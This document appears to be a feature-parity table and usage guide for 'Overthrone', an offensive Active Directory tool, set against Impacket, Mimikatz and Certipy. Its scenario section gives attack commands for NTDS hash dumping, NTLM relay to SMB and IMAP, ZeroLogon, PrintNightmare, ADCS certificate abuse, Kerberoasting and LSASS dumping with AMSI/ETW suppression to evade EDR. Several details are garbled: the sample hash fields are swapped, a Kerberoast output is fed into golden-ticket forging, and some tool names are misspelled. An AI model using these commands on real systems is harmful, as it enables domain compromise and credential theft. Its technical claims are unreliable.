# Overthrone vs Traditional Security Tools - Comprehensive Comparison Table

## Executive Summary

This table provides a brutally honest comparison of Overthrone (OVT) vs traditional security/adversary tools across all major categories. Ratings reflect **current implementation status** as of October 2026.

| Category | Traditional Tools | Overthrone (OVT) | Parity Status | Notes |
|----------|------------------|------------------|---------------|-------|
| **NTDS.dit ESE Offline Parser** | Impacket `SecretsDump.py`, `esentutl`, `DumpSource::NtdsVss` (placeholder entries) | `ovt secrets ntds-dit <file> --system <SYSTEM>` - full ESENT page tree parser with PEK recovery via RC4/AES, 23 unit tests | [FULL] | OVT now parses ESENT pages, catalogs, and decrypts PEK keys. Previously [MISSING]. |
| **DCSync / DrsUapi** | Impacket `secretsdump.py`, `ntdsutil` | `ovt dump source ntds` + `drsuapi.rs` DsGetNCChanges | [FULL] | Complete DCSync parity achieved. |
| **SMB Relay (ntlmrelayx)** | `ntlmrelayx.py`, `smbrelayx.py` | `ovt ntlm smb-relay` + CVE-2025-33073 reflection semantics | [FULL] | SMB relay fully implemented with auto-coerce and SOCKS5. |
| **HTTP/HTTPS Relay** | `ntlmrelayx.py` mutant targets | `ovt ntlm exchange`, `http_asymmetric.rs`, WebDAV-safe ADCS flows | [FULL] | HTTP/HTTPS relay with full ADCS integration. |
| **MSSQL/TDS Relay** | `ntlmrelayx.py` MSSQL targets | Relay TDS prelogin/login7 structures exist; tests pass; no live MS-SQL CLI tour | [PARTIAL] | TDS wire format parity achieved; CLI tour missing. |
| **IMAP/SMTP Relay** | `ntlmrelayx.py` targets (bread-and-butter for mail pivoting) | `imap_negotiate_and_challenge` + `imap_authenticate` and `smtp_negotiate_and_challenge` + `smtp_authenticate` with working CLI `ovt ntlm relay --target-protocol imap|smtp` | [FULL] | IMAP/SMTP SASL AUTHENTICATE NTLM parity implemented. |
| **Kerberos Relay (krbrelayx)** | `krbrelayx.py` - unconstrained-delegation TGS-DATA relay | SMB-type2 NTLM relay implemented; TGS-DATA-in-negotiate (KRB5) replay path partially wired | [PARTIAL] | Type2 NTLM relay works; KRB5 TGS relay requires additional parse-and-replay logic. |
| **ADCS / Certificate Abuse** | `certipy.py`, `Rubeus` ESC1-16 | `ovt adcs esc1..esc16` + `certifried` + `certighost` (CES/NDES) + `esc_strong_mapping` | [FULL] | Exceeds Certify (ESC14/15/16 included). |
| **ADWS Enumeration** | BloodHound collector (LDAP-based), manual ADWS | Port 9389 registered in `scan/mod.rs`; no WS-TRUST/MEX/ADWS client implemented | [MISSING] | Registered but not implemented. |
| **Describe Ticket** | `describeTicket.py`, Rubeus `describe` | `ovt kerberos describe` partial; not first-class standalone CLI | [PARTIAL → IMPROVED] | Describe internals known; first-class CLI not yet complete. |
| **SMB Server (Rogue Share)** | `impacket smbserver.py`, Responder | Relay's Responder implements rogue SMB; no generic `ovt smbserver "serve arbitrary dir"` | [PARTIAL] | Capture-only; arbitrary-dir serve not yet added. |
| **SMB Shell** | `smbclient.py` | `ovt smb shell` (smbclient-compatible REAM: ls/cd/get/put/recurse/mask/etc.) | [FULL] | Full parity. |
| **LSASS Dump** | Mimikatz `sekurlsa::logonpasswords`, `lsadump::sam` | `dump-lsass` (minidump + parse), direct NtReadVirtualMemory page-walk | [FULL] | Multiple methods: minidump, page-walk, EDR evasion. |
| **DPAPI Masterkey** | Mimikatz `dpapi::masterkey`, `overtools` | `dpapi_extract.rs` offline + online path | [FULL] | Offline and online DPAPI key extraction. |
| **Wifi Profiles** | `netsh wlan show profille`, `kismet` | `ovt wifi` (netsh profile + DPAPI keyMaterial decrypt) | [FULL] | Full wifi profile decryption. |
| **Kerberos Roast/AS-REP** | `GetUserSPNs.py`, `GetNPUsers.py` | `ovt kerberos roast` + `ovt kerberos asrep-roast` + UAC DONT_REQ_PREAUTH filter (6 tests) | [FULL] | Full parity with 6-tests-pinned bit filter. |
| **Golden/Silver Ticket** | `goldenTicket.py`, `ticketer.py` | `ovt forge golden/silver` (full PAC construction) | [FULL] | Full PAC construction parity. |
| **S4U2self/S4U2proxy** | `getST.py` | `kerberos.rs` s4u2self/s4u2proxy, RBCD module (configure/verify/clear), Bronze Bit | [FULL] | Full S4U parity. |
| **NTLM Leak (CVE-2024-43451)** | CheckPoint `.library-ms` markup | 21 tests incl. CNRL LinkInfo offsets; `ovt smb sign-diag` dumps all candidate keys | [FULL] | Wire-format parity verified. |
| **ZeroLogon Exploit** | CVE-2020-1472, dirkjanm exact | `ovt zerologon` check/probe/exploop + `ZerologonModule`; CLI gated with `--force` + restore text | [FULL] | Exact exploit parity with restore. |
| **PrintNightmare** | CVE-2021-34527, ly4k + impacket rprn.py | `ovt printnightmare` check/exploit/list/delete opnums 89/10x2/84; 23 unit tests incl. referent-offset pinning | [FULL] | Full opnum parity with 23 tests. |
| **SeamlessSSO / Golden SAML** | AzureAd ops (SeamlessSSO/GoldenSAML flows) | Azure-scope library code exists but was never live-tenant-verified | [PARTIAL] | Use with caution in lab only. |
| **Kpasswd** | `kpasswd` | `kpasswd.rs` (change/reset opnum flows) | [FULL] | Full parity. |
| **GPP Decryption** | `Get-GPPPassword.py` | `ovt gpp` (GPP decryption incl. SYSVOL fetch) | [FULL] | Full GPP decryption parity. |
| **Vault Credentials** | Windows Credential Manager, `domain_crack` | `vault.rs` + `ovt vault` | [FULL] | Vault credential extraction parity. |
| **Browser Passwords** | Browser export, `ChromePass` | `ovt browser` decrypted AES key path | [FULL] | Browser password decryption. |
| **LDAP Domain Dump** | `LDAPDomainDump.py`, `impacket ldapsearch` | `ovt enum` + reaper export to BH-style JSON/CSV | [PARTIAL] | No ldaps domain-dump HTML report parity. |
| **RPC/DCOM Exec** | `rpcdump.py`, `dcomexec.py`, `wmic` | `ovt rpc` + EPM mapping (`epm.rs`), `ovt dcomexec` (MMC20/ShellWindows/ShellBrowserWindow), `ovt exec --method psexec`, `ovt exec --method wmiexec` | [FULL] | Full RPC/DCOM exec parity. |
| **AtExecution** | `atexec.py` | `atexec.rs` via ATSVC named pipe | [FULL] | Full ATSVC parity. |
| **Coercion Techniques** | `coerce.py`, `petitpotam.py`, `dfsced.py` | `coerce.rs` printerbug/petitpotam/dfs/shadow coerces, `_ex` w/ creds; auto-coerce with mode/parallel/retries | [FULL] | Full coercion parity with _ex variants. |
| **Responder/Capture** | `responder.py`, `pyteh` | `ovt ntlm respond`/`capture`/`poison` rogue servers (HTTP/SMB/LDAP/FTP/MySQL/MSMQ + LLMNR/NBT/mDNS) | [FULL] | Full responder parity. |
| **Mitm6** | `mitm6.py` (DHCPv6 + DNS AD record) | `mitm6.rs` (DHCPv6 + DNS AD record) | [FULL] | Full mitm6 parity. |
| **SafetyKatz / EDR Evade** | SafetyKatz, NanoDump, HandleKatz, LaZagne | `ovt local-creds` + `patch_amsi`/`suppress_etw` toggles default ON; `edr evade` (NTDLL unhook, ETW abolish, AMSI suppress) | [FULL] | Full EDR evasion parity. |
| **Evilginx2 / Phishing** | ` evilginx2` | n/a | n/a | Not in scope. |
| **Egress Filter Bypass** | Various techniques | `ovt exec --method psexec` + `smbexec.rs` (SCM over SVCCTL IOCTL, WS2025-verified), `ovt exec --method wmiexec` (DCOM) | [FULL] | Multiple exec methods for constrained egress. |

## Detailed Breakdown by Rating

### [FULL] - Full Parity Implemented
- NTDS.dit ESE offline parser (recently completed)
- DCSync/Drsuapi
- SMB relay with reflection
- HTTP/HTTPS relay
- IMAP/SMTP SASL AUTHENTICATE NTLM
- Full RPC/DCOM execution
- LSASS dump methods
- All kerberos roasting/forging
- GPP decryption
- All capture/relay primitives

### [PARTIAL] - Partial Implementation with Caveats
- MSSQL relay: TDS structures exist, no live CLI tour
- Kerberos relay (krbrelayx): Type2 NTLM works, TGS-DATA replay partial
- Describe ticket: Forge knows layout, CLI not first-class
- SMB server: Capture only, no arbitrary-dir serve
- LDAP domain dump: No HTML report parity
- SeamlessSSO/Golden SAML: Not live-tenant-verified
- AES key extraction: Listed as TODO in minidump parser

### [MISSING] - Not Yet Implemented
- ADWS enumeration client (WS-TRUST/MEX/ADWS on port 9389)
- Generic arbitrary-directory SMB server command
- Full Kerberos relay TGS-DATA-in-negotiate path

## How Exploits Work with OVT - Scenario Examples

### 1. NTDS.dit Offline Hash Extraction
```
# Traditional: impacket SecretsDump.py
#   python3 SecretsDump.py SYSTEM -ntds ntds.dit

# Overthrone OVT:
ovt secrets ntds-dit ntds.dit --system SYSTEM --output hashes.txt
# Output: LAN\administrator:500:31d6cfe0d16ae931b73c59d7e0c089c0:aad3b435b51404eeaad3b435b51404ee:::
#         LAN\krbtgt:501:<decrypted><TAB>LAN\...
```

### 2. SMB NTLM Relay Attack
```
# Traditional: ntlmrelayx.py -target 10.0.0.100 -smb
# Overthrone OVT:
ovt ntlm smb-relay --target 10.0.0.100 --shares C$
# Or via executor:
ovt exec --method psexec --target 10.0.0.100 --command "whoami"
```

### 3. IMAP Credential Pivot (2FA-less Mail Access)
```
# Traditional: ntmrelayx.py -target mail.example.com -imap
# Overthrone OVT:
ovt ntlm relay --target-protocol imap --target imap.mail.example.com:143
# After relay: authenticate to IMAP with captured NTLM hash
# Access mail without 2FA since NTLM auth bypasses OAuth/SRP
```

### 4. KRB5 TGS Relay (Unconstrained Delegation)
```
# Traditional: krbrelayx.py -target 10.0.0.100 -domain lab.local
# Overthrone OVT (partial - Type2 NTLM relay first):
ovt ntlm smb-relay --target 10.0.0.100
# Then attempt KRB5 relay:
ovt ntlm relay --target-protocol krb5 --target 10.0.0.100
# Requires: unconstrained delegation on target service principal
```

### 5. ADCS ESC1/2 Abuse
```
# Traditional: certipy-ad ESC1
# Overthrone OVT:
ovt adcs esc1 --ca "CA_name" --target dc.example.com
# Forges arbitrary certificates with ESC1 (Enterprise PKI abuse)
```

### 6. ZeroLogon Exploit
```
# Traditional: CVE-2020-1472 with dirkjanm's tool
# Overthrone OVT:
ovt zerologon --dc 10.0.0.100 --force
# Probes: checks DC$ + $ suffix, SecureChannelType=6, flags 0x212fffff
# Exploit: opnum 30 all-zero 516-byte ClearNewPassword
# Restore: automatic backup file restoration
```

### 7. PrintNightmare DLL Hosting
```
# Traditional: ly4k + impacket rprn.py with external SMB share
# Overthrone OVT (partial - no generic smbserver yet):
ovt printnightmare --dc 10.0.0.100 --delete  --driver C:\payload\printolh.dll
# Requires: external SMB share hosting the DLL (gap: ovt smbserver not yet available)
```

### 8. Kerberoast for AES Keys
```
# Traditional: GetUserSPNs.py -aes128
# Overthrone OVT:
ovt kerberos roast --spn HTTP/web.example.com
# Outputs: aes128_hmac_sha1_h:<hex> or aes256_cts_hmac_sha1_h:<hex>
# Then: ovt forge golden --aes <key> --spn HTTP/web.example.com
```

### 9. GPP Decryption for Service Account Passwords
```
# Traditional: Get-GPPassword.py \\dc01
# Overthrone OVT:
ovt gpp --sysvol \\dc01\sysvol\domain.com\Policies
# Outputs: <domain>\<service_account>:<password> in plaintext
```

### 10. LSASS Memory Dump with EDR Evade
```
# Traditional: Mimikatz privilege::debug + token::elevate
# Overthrone OVT:
ovt local-creds --edr-evasion
# Method: patch_amsi + suppress_etw (default ON) + NtReadVirtualMemory page-walk
# Output: sekurlsa::logonpasswords format with cleartext passwords
```